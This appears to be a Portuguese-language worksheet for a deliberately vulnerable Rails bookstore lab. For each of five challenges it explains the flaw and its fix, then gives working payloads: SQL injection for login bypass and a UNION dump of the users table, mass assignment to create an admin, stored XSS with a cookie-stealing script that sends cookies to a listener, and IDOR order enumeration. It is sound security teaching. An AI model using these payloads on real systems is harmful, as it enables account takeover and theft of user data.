01 2 pts
SQL Injection — Login
A03 · Injection
alvo: POST /login · campo email
// por que acontece

O login monta SQL concatenando email e senha dentro da string da query (WHERE … '#{email}' … '#{password}'). Para o banco isso é texto SQL — não há separação entre “valor” e “comando”. Você injeta operadores (OR, aspas, etc.) e muda o significado do WHERE; com isso o aplicativo pode autenticar sem senha correta.

Correção típica: consultas parametrizadas ou ORM só com binds; senha com has_secure_password / bcrypt fora do SQL.

// payload
# Texto no campo email (fecha aspas + OR — senha ignorada): admin@bookstore.com') OR ('1'='1 # Via curl (use --data-urlencode; "+-+ vira espaços, não é "--"): curl -c cookies.txt -X POST http://localhost:3000/login \ --data-urlencode "email=admin@bookstore.com') OR ('1'='1" \ --data-urlencode "password=x" # Sucesso: HTTP 302 para / (sessão como admin). SQLite + Rails em uma linha SQL: # o truque clássico com '--' pode gerar 500; este OR funciona no lab atual.

02 2 pts
Mass Assignment — Criar Admin
A04 · Insecure Design
alvo: POST /users · campo role e credits
// por que acontece

O cadastro usa params[:user].permit!, que libera todos os atributos permitidos pelo mass assignment. Campos extras no POST (role, credits) são aplicados ao model como qualquer outro — não há lista explícita “só nome, email e senha”.

Correção típica: strong parameters — params.require(:user).permit(:name, :email, :password) — sem role/credits.

// payload
# Email único a cada execução (evita 422 por uniqueness em h@evil.com) LAB_EMAIL="h-$(date +%s)@evil.com" curl -X POST http://localhost:3000/users \ --data-urlencode "user[name]=Hacker" \ --data-urlencode "user[email]=$LAB_EMAIL" \ --data-urlencode "user[password]=123" \ --data-urlencode "user[role]=admin" \ --data-urlencode "user[credits]=999999" # Verificar no rails console (usuário mais recente == o que você acabou de criar): User.order(created_at: :desc).first.role # => "admin" ← sucesso! credits deve ser 999999 também.
// evidência (output do console ou print)
03 2 pts
XSS Stored — Comentários
A03 · Injection
alvo: POST /books/:id/comments · campo body
// por que acontece

O comentário é salvo no banco sem sanitização e a página renderiza com raw(comment.body). O ERB padrão escapa HTML (< vira texto); raw desliga esse escape. O navegador então processa tags como <script> como código — XSS persistente para todo visitante da página.

Correção típica: não usar raw em dado de usuário; sanitizar com lista branca ou só texto escapado. Cookie de sessão com HttpOnly limita roubo via document.cookie, mas não elimina o XSS.

// payload no campo de comentário
<!-- Cole no formulário de comentário: --> <script>alert('XSS — cookie: ' + document.cookie)</script> # Por que document.cookie pode vir vazio? O Rails guarda a sessão em cookie HttpOnly # — o navegador envia o cookie nas requisições, mas JS não pode ler (defesa real). # O XSS continua válido (execução arbitrária); o roubo da sessão por document.cookie falha. <!-- Variante com roubo de cookie (só vê cookies sem HttpOnly): --> <script>new Image().src='http://localhost:9999/?c='+document.cookie</script> # Receptor (em outro terminal): python3 -m http.server 9999
// evidência (print do alert ou log do receptor)
04 2 pts
IDOR — Pedidos de outros usuários
A01 · Broken Access Control
alvo: GET /orders/:id · ID de outro usuário
// por que acontece

O detalhe do pedido faz Order.find(params[:id]): qualquer ID existente é carregado. Não há verificação de que order.user_id == current_user.id (nem equivalente em policy). Quem está logado só precisa adivinhar/enumerar IDs — referência direta a objeto sem autorização por dono.

Correção típica: current_user.orders.find(params[:id]) ou autorização explícita antes de expor o registro.

// payload — iterar IDs
# Obter sessão da Alice (precisa de db:seed): curl -c alice_cookies.txt -X POST http://localhost:3000/login \ --data-urlencode "email=alice@user.com" \ --data-urlencode "password=pass123" # Logada como alice, enumerar pedidos (Bob tem pedido no seed): for i in 1 2 3 4; do echo "=== /orders/$i ===" curl -s -b alice_cookies.txt http://localhost:3000/orders/$i | grep -Eo '[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}' done # Sucesso: aparece bob@user.com (pedido de outro usuário)
// evidência (email ou dados de outro usuário visíveis)
05 2 pts
SQL Injection — Campo de busca
A03 · Injection
alvo: GET /search?q= · UNION-based dump
// por que acontece

O parâmetro q é interpolado dentro da SQL (WHERE title = '…' OR author = '…' via string Ruby). Assim como no login, entrada do usuário vira parte do programa SQL: um UNION acrescenta linhas de outra tabela desde que o número/tipos de colunas batam com o primeiro SELECT — aqui, com as colunas de books.

Correção típica: binds (?) ou hashes do ActiveRecord; nunca interpolar params em fragmento SQL cru.

// payload — dump de usuários via UNION (9 colunas = tabela books)
# Busca vulnerável usa igualdade em title/autor; UNION no nível do SELECT. curl --get http://localhost:3000/search \ --data-urlencode "q=' UNION SELECT id,email,password_digest,name,1.0,role,credits,datetime('now'),datetime('now') FROM users -- " # Sucesso: emails (no “título” do card) e valores da conta misturados ao catálogo # Login opcional para outras demos: curl -c cookies.txt -X POST ... /login ...
// evidência (emails ou hashes visíveis na resposta)
